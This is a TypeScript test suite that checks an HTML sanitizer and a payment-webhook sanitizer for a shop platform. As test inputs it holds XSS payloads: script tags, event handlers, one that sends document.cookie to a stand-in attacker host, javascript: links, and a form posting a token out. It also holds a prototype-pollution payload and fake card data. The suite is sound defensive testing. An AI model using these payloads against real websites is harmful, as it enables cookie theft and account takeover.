import { describe, it, expect } from "vitest";
import { sanitizeRichText } from "@bs/blocks";
import { sanitizePaymentPayload } from "@bs/payments";

describe("Hostile Payload Sanitization Suite (PLAN §4, §15, M6 Hardening)", () => {
  describe("Rich Text HTML & CMS Blocks Sanitization (ADR-009)", () => {
    it("strips direct script tags and nested script obfuscations", () => {
      const hostile = [
        '<script>alert("xss")</script>',
        '<SCRIPT SRC="https://attacker.example.com/exploit.js"></SCRIPT>',
        '<<SCRIPT>alert("nested");//<</SCRIPT>',
        '<script/xss src="data:text/javascript,alert(1)"></script>',
        '<script defer async>document.cookie</script>',
      ];

      for (const input of hostile) {
        const sanitized = sanitizeRichText(input);
        expect(sanitized).not.toContain("<script");
        expect(sanitized).not.toContain("alert");
        expect(sanitized).not.toContain("exploit.js");
        expect(sanitized).not.toContain("document.cookie");
      }
    });

    it("strips event handlers on all tags (onerror, onload, onclick, onmouseover)", () => {
      const hostile = [
        '<img src="invalid-image.png" onerror="alert(\'xss\')">',
        '<svg onload="alert(document.domain)">',
        '<body onload="alert(\'pwned\')">',
        '<div onmouseover="fetch(\'https://attacker.example.com/steal?\'+document.cookie)">Hover me</div>',
        '<p onclick="window.location=\'https://malicious.com\'">Click here</p>',
        '<a href="https://example.com" onfocus="alert(1)">Link</a>',
        '<video poster="thumb.jpg" onerror="alert(1)"></video>',
      ];

      for (const input of hostile) {
        const sanitized = sanitizeRichText(input);
        expect(sanitized).not.toMatch(/on\w+\s*=/i);
        expect(sanitized).not.toContain("alert");
        expect(sanitized).not.toContain("attacker.example.com");
      }
    });

    it("strips dangerous pseudoprotocols (javascript:, vbscript:, data: text/html)", () => {
      const hostile = [
        '<a href="javascript:alert(1)">Malicious link</a>',
        '<a href="jav&#x09;ascript:alert(1)">Obfuscated entity link</a>',
        '<a href="javascript:fetch(\'/api/leak\')">API exploit</a>',
        '<a href="data:text/html,<script>alert(1)</script>">Data URI exploit</a>',
        '<a href="vbscript:msgbox(1)">VBScript link</a>',
      ];

      for (const input of hostile) {
        const sanitized = sanitizeRichText(input);
        expect(sanitized).not.toContain("javascript:");
        expect(sanitized).not.toContain("vbscript:");
        expect(sanitized).not.toContain("data:text/html");
        expect(sanitized).not.toContain("alert");
      }
    });

    it("strips dangerous embedding tags (iframe, object, embed, applet, form)", () => {
      const hostile = [
        '<iframe src="https://attacker.example.com/login" srcdoc="<script>alert(1)</script>"></iframe>',
        '<object data="https://attacker.example.com/exploit.swf"></object>',
        '<embed src="https://attacker.example.com/exploit.pdf">',
        '<form action="https://attacker.example.com/capture" method="POST"><input name="token" value="secret"/></form>',
        '<style>body { background: url("https://attacker.example.com/track"); }</style>',
      ];

      for (const input of hostile) {
        const sanitized = sanitizeRichText(input);
        expect(sanitized).not.toContain("<iframe");
        expect(sanitized).not.toContain("<object");
        expect(sanitized).not.toContain("<embed");
        expect(sanitized).not.toContain("<form");
        expect(sanitized).not.toContain("<input");
        expect(sanitized).not.toContain("<style");
      }
    });

    it("preserves legitimate HTML tags and injects rel=noopener noreferrer on external links", () => {
      const legitimate = `
        <div class="content-wrapper">
          <h1>Product Specifications</h1>
          <p>This is a <strong>top-tier</strong> <em>merino wool</em> shirt.</p>
          <ul>
            <li>100% Organic Wool</li>
            <li>Machine washable</li>
          </ul>
          <a href="https://example.com/sizing" target="_blank">View Size Chart</a>
          <img src="https://images.unsplash.com/photo-1" alt="Product photo" width="400" height="300" />
        </div>
      `;

      const sanitized = sanitizeRichText(legitimate);
      expect(sanitized).toContain("<h1>Product Specifications</h1>");
      expect(sanitized).toContain("<strong>top-tier</strong>");
      expect(sanitized).toContain("<em>merino wool</em>");
      expect(sanitized).toContain("<li>100% Organic Wool</li>");
      expect(sanitized).toContain('href="https://example.com/sizing"');
      expect(sanitized).toContain('rel="noopener noreferrer"');
      expect(sanitized).toContain('alt="Product photo"');
    });
  });

  describe("Webhook & Payment Payload Sanitization (PLAN §4, §11.4)", () => {
    it("strips PAN, card numbers, and CVV from flat and deeply nested objects", () => {
      const dirty = {
        event: "payment.captured",
        id: "pay_123456",
        amount: 50000,
        currency: "INR",
        card: {
          number: "4111222233334444",
          card_number: "4111222233334444",
          cvv: "123",
          cvc: "456",
          expiry: "12/28",
          exp_month: 12,
          exp_year: 2028,
          network: "Visa",
        },
        customer: {
          email: "buyer@example.com",
          payment_info: {
            saved_card_number: "5500000000000004",
            cvv_code: "999",
          },
        },
      };

      const sanitized = sanitizePaymentPayload(dirty);

      // Verify sensitive card object and keys are stripped completely (PCI-DSS compliance)
      expect(sanitized.card).toBeUndefined();

      const customer = sanitized.customer as Record<string, unknown> | undefined;
      const paymentInfo = customer?.payment_info as Record<string, unknown> | undefined;
      expect(paymentInfo?.cvv_code).toBeUndefined();

      // Verify business data is intact
      expect(sanitized.event).toBe("payment.captured");
      expect(sanitized.id).toBe("pay_123456");
      expect(sanitized.amount).toBe(50000);
      expect(sanitized.currency).toBe("INR");
    });

    it("strips authorization secrets, access tokens, and passwords in arrays and objects", () => {
      const dirty = {
        meta: {
          authorization: "Bearer secret_jwt_token_here",
          access_token: "rzp_live_super_secret_token",
          key_secret: "super_secret_signing_key",
          password: "db_password_leak",
        },
        transactions: [
          {
            id: "txn_001",
            amount: 25000,
            secret_code: "topsecret",
            token: "tok_visa_4242",
          },
          {
            id: "txn_002",
            amount: 75000,
            status: "success",
          },
        ],
      };

      const sanitized = sanitizePaymentPayload(dirty);

      const meta = sanitized.meta as Record<string, unknown> | undefined;
      expect(meta?.authorization).toBeUndefined();
      expect(meta?.access_token).toBeUndefined();
      expect(meta?.key_secret).toBeUndefined();
      expect(meta?.password).toBeUndefined();

      const txns = sanitized.transactions as Array<Record<string, unknown>>;
      expect(txns).toHaveLength(2);
      expect(txns[0]?.secret_code).toBeUndefined();
      expect(txns[0]?.token).toBeUndefined();
      expect(txns[0]?.id).toBe("txn_001");
      expect(txns[0]?.amount).toBe(25000);
      expect(txns[1]?.status).toBe("success");
    });

    it("prevents prototype pollution vectors through crafted payloads", () => {
      const maliciousPayload = JSON.parse(`{
        "__proto__": { "polluted": true },
        "constructor": { "prototype": { "admin": true } },
        "event": "charge.succeeded"
      }`);

      const sanitized = sanitizePaymentPayload(maliciousPayload);

      // Verify Object prototype was not polluted
      expect((Object.prototype as unknown as { polluted?: boolean }).polluted).toBeUndefined();
      expect((Object.prototype as unknown as { admin?: boolean }).admin).toBeUndefined();
      expect(sanitized.event).toBe("charge.succeeded");
    });
  });
});
